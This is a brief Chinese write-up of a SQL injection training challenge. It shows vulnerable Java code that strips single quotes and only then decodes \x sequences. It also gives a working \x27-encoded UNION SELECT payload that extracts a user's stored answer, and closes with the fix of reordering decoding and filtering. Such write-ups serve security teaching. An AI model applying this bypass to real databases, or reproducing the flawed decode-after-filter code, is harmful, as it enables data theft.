#  SQL Injection Challenge 6(SQL 注入 6)

## 题介绍
利用SQL注入点,获得通关密钥  

## 功能实现 
请求数据包  
```
POST /challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2 HTTP/1.1


pinNumber=1234
```

解析代码   
```
userPin = userPin.replaceAll("\\\\", "\\\\\\\\").replaceAll("'", ""); // Escape single quotes
log.debug("userPin scrubbed - " + userPin);
userPin = java.net.URLDecoder.decode(userPin.replaceAll("\\\\\\\\x", "%"), "UTF-8"); //Decode \x encoding 
log.debug("searchTerm decoded to - " + userPin);
Connection conn = Database.getChallengeConnection(applicationRoot, "SqlChallengeSix");
log.debug("Looking for users");
PreparedStatement prepstmt = 
		conn.prepareStatement("SELECT userName FROM users WHERE userPin = '" + userPin + "'");
ResultSet users = prepstmt.executeQuery();
```

单引号被过滤了  

但这个题会接收URL编码，因此绕过了第一步的单引号过滤  

## 解题步骤  
只需要使用\x27 代替单引号即可    
```
\x27\x20UNION\x20SELECT\x20userAnswer\x20FROM\x20users\x20WHERE\x20userName\x20\x3D\x20\x27Brendan\x27\x3B\x20--\x20
```
## 总结  
安全过滤的顺序非常的重要，如果将url解码和单引号过滤功能互换即可达到安全校验效果  
